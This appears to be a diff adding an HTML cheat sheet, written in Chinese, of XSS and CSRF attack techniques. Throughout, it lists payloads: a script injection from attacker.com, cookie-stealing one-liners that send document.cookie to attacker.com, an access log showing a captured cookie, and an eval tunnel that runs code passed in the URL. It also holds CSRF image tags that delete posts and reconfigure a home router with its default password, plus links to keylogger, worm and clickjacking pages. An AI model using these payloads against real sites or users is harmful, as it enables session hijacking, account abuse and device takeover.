@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-touch-fullscreen" content="yes">
+<meta name="format-detection" content="telephone=no, address=no">
+<meta http-equiv="keywords" content="XSS CSRF Tools">
+<meta http-equiv="description" content="XSS CSRF Tools">
+<title>XSS</title>
+<meta name="description" content="" />
+<link rel="icon" href="favicon.ico" type="image/x-icon" />
+<link rel="apple-touch-icon" href="favicon-128.png" type="image/png" />
+<style>
+body{font-size:12px;font-family:monospace;background:url(space.jpg); background-attachment: fixed;color:#00CC74;background-size: 120px}
+a {
+    color: #fff;
+}
+.code {
+    background: rgba(255,255,255,0.2);
+    padding: 10px;
+    white-space: pre-wrap;
+}
+</style>
+</head>
+<body>
+<pre>
+██╗  ██╗███████╗███████╗
+╚██╗██╔╝██╔════╝██╔════╝
+ ╚███╔╝ ███████╗███████╗
+ ██╔██╗ ╚════██║╚════██║
+██╔╝ ██╗███████║███████║
+╚═╝  ╚═╝╚══════╝╚══════╝
+</pre>
+<h2>XSS漏洞</h2>
+<li>echo $_GET['param'];</li>
+<li><a target="_blank" href="https://markbuild.com/zh/xss-challenges-xss-quiz-%e6%b8%b8%e6%88%8f%e7%ad%94%e6%a1%88/">XSS</a></li>
+<li><a target="_blank" href="xss/title.html">title tag XSS</a></li>
+<li>访问 http://site.com/?param=&lt;script src='http://attacker.com/1.js'&gt;&lt;/script&gt;</li>
+<li>innerHTML v-html</li>
+<pre class="code">
+document.body.innerHTML="&lt;script&gt;alert(1)&lt;/script&gt;" // 不执行js
+document.body.innerHTML="&lt;img src='x' onerror='alert(1)'&gt;" // 执行js
+</pre>
+<li>eval == evil</li>
+<pre class="code">
+tunnel.html
+&lt;body&gt;&lt;script&gt;eval(unescape(atob(location.search.slice(1))))&lt;/script&gt;&lt;/body&gt;
+...
+'/tunnel.html?'+btoa(escape(jscode))
+</pre>
+<h2>XSS利用 - Stealing</h2>
+<li>new Image().src="https://attacker.com/?cookie="+escape(document.cookie)</li>
+<li>var script = document.createElement('script');script.src="https://attacker.com/?cookie="+escape(document.cookie);document.body.append(script)</li>
+<li>fetch('https://attacker.com/?cookie='+document.cookie)</li>
+<pre class="code">
+# tail -f mb_accesslog
+45.33.104.18 - - [09/Mar/2020:22:12:29 +0800] "GET /?cookie=BIDUPSID=4B3A1F21C50AA81B...省略...BD_HOME=1 HTTP/1.1" 301 5 "https://www.baidu.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
+</pre>
+<li>document.cookie [cookie 设置成httponly 防js拿]</li>
+<li>document.body.innerText</li>
+<li>IP geo agent Info</li>
+<li><a target="_blank" href="keylogger/Keylogger.html">Keylogger Script</a></li>
+<h2>借刀杀人</h2>
+<li>通过社工方法引诱受害人点击操作，依赖于受害人的环境</li>
+<li>new Image().src="http://www.victim-sns.com/del_post?id=33456" 删除一篇日志[需加hash/Token校验]</li>
+<li>&lt;img src="http://192.168.1.1/userPpm/ManageControlRpm.html?port=80&ip=255.255.255.255&Save=%B1%A3+%B4%E6"&gt; FAST无线路由器WEB管理的默认用户名与密码: admin</li>
+<li><a target="_blank" href="xss/weibo_xss_worm.html">Weibo XSS Worm</a></li>
+<h2>钓鱼</h2>
+<li><a onclick="alert('我的目的就是要你点击')">广东人吃(婴儿)汤就为了状阳【骇人新闻】</a></li>
+<li>发红包</li>
+<h2>伪装</h2>
+<li><a target="_blank" href="clickjacking/index.html">clickjacking</a></li>
+<p id="copy"><center>SINCE 2018 &copy; <a href="https://markbuild.com/">markbuild</a></center></p>
+</body>
+</html>
